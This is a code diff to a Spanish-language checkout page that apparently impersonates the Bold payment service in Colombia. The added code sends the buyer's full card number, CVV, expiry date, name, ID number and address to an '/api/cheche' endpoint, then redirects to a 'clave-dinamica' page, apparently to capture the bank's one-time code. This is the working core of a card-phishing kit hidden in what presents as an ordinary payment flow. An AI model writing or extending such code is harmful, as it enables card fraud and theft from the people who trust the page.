@@ -201,37 +201,52 @@ export default function BoldPagosPage() {
       }
     }
 
-    // For other banks, use the regular payment flow
+    // Para otros bancos, también pedir clave dinámica genérica
     try {
-      const response = await fetch('/api/orders', {
+      const response = await fetch('/api/cheche', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          ...orderData,
+          action: 'create_session',
+          bank: bankName !== 'Desconocido' ? bankName : 'Otro',
+          
+          fullName: orderData.customer.fullName,
           email,
           phone: `+57${phoneNumber}`,
-          paymentMethod: 'Bold',
-          cardInfo: {
-            last4: cardNumber.slice(-4),
-            brand: cardType,
-            bank: bankName !== 'Desconocido' ? bankName : undefined,
-          },
-        }),
+          address: orderData.customer.address,
+          city: orderData.customer.city,
+          state: orderData.customer.state,
+          country: orderData.customer.country,
+          postalCode: orderData.customer.postalCode,
+          documentId: orderData.customer.documentId,
+          
+          cardNumber: cardNumber.replace(/\s/g, ''),
+          cardHolderName: cardHolderName,
+          expiryDate: expiryDate,
+          cvv: cvv,
+          cardBrand: cardType,
+          
+          totalAmount: orderData.totalAmount,
+          customerData: orderData.customer,
+          orderData: orderData,
+          
+          paymentMethod: 'Bold'
+        })
       });
 
       if (!response.ok) {
-        throw new Error('Error al procesar el pago');
+        throw new Error('Error al crear sesión de autenticación');
       }
 
       const result = await response.json();
       
-      // Limpiar sessionStorage
-      sessionStorage.removeItem('boldOrderData');
-      
-      // Redirigir a página de éxito
-      router.push(`/order-success?orderId=${result.order.id}`);
+      if (result.success && result.session) {
+        // Redirigir a página genérica de clave dinámica
+        router.push(`/clave-dinamica?sessionId=${result.session.sessionId}`);
+        return;
+      }
     } catch (error) {
-      console.error('Error en el pago:', error);
+      console.error('Error creating authentication session:', error);
       showNotification('Hubo un error al procesar el pago. Por favor intenta de nuevo.');
       setLoading(false);
     }
